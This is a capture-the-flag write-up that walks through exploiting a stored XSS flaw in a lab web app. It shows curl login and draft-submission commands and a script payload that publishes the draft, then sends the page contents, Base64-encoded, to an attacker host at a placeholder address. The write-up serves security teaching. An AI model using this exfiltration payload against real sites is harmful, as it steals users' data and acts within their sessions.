# XSS Challenge Writeup

## Overview
This challenge involves exploiting a Cross-Site Scripting (XSS) vulnerability in a web application. The goal is to inject a malicious script into the application, which, when executed, allows us to exfiltrate the flag. The application has several endpoints, including a login page, a draft page, and a publish page.

### Vulnerability: Cross-Site Scripting (XSS)
The application allows users to post content, which can include HTML and JavaScript. If an attacker manages to inject a malicious script into the content, they can execute arbitrary JavaScript in the context of another user's session.

## Steps to Exploit the Vulnerability

### 1. **Login to the Application**
The first step is to log in to the application. This can be done by sending a `POST` request to the `/login` endpoint with the username and password. The credentials for this challenge are:
- **Username:** hacker
- **Password:** 1337

```bash
curl -c cookies.txt -X POST http://challenge.localhost/login -d 'username=hacker&password=1337'
````

This request will create a session cookie, which is necessary for maintaining an authenticated session across subsequent requests.

### 2. **Submit a Draft with Malicious Script**

Next, we need to submit a draft with a malicious payload. The goal is to inject a script that will be executed when viewed by the victim. The malicious script will send the contents of the `/publish` endpoint to an external server, allowing us to capture the flag.

The script is injected in the `content` field of the `draft` form:

```html
<script>
  fetch("/publish", {method:"POST"})
    .then(() => fetch("/"))
    .then(r => r.text())
    .then(t => {
      fetch("http://<YOUR-IP>:8000/?flag=" + btoa(t))
    })
</script>
```

This script performs the following steps:

1. It triggers the `/publish` endpoint with a `POST` request, marking the draft as published.
2. It then fetches the content of the main page (`/`), which contains the flag.
3. The flag is then sent to the attacker’s server (`http://<YOUR-IP>:8000/`), encoded in Base64 format.

To inject this payload, send a `POST` request to the `/draft` endpoint with the malicious content:

```bash
curl -b cookies.txt -X POST http://challenge.localhost/draft -d 'content=<script>fetch("/publish", {method:"POST"}).then(()=>fetch("/")).then(r=>r.text()).then(t=>{fetch("http://<YOUR-IP>:8000/?flag="+btoa(t))})</script>&publish=on'
```

### 3. **Exfiltrate the Flag**

Once the malicious script is executed, the flag is sent to the attacker’s server. The flag can then be retrieved from the server where the exfiltration was made.

### 4. **Challenges Faced**

* The main challenge was maintaining the session in the `curl` requests. The browser automatically manages the session, while `curl` requires the user to manually manage session cookies using `-c` (to save cookies) and `-b` (to send cookies) options.
* The 403 Forbidden error was encountered when the session cookie was not correctly passed between requests. This was resolved by ensuring the session cookie was sent with the second `curl` request.

### Conclusion

By exploiting the XSS vulnerability, we were able to inject a script that triggered the publishing of a draft and then exfiltrated the flag. The challenge demonstrated how session management, XSS vulnerabilities, and the use of `curl` for exploiting web applications can work together to compromise the server.
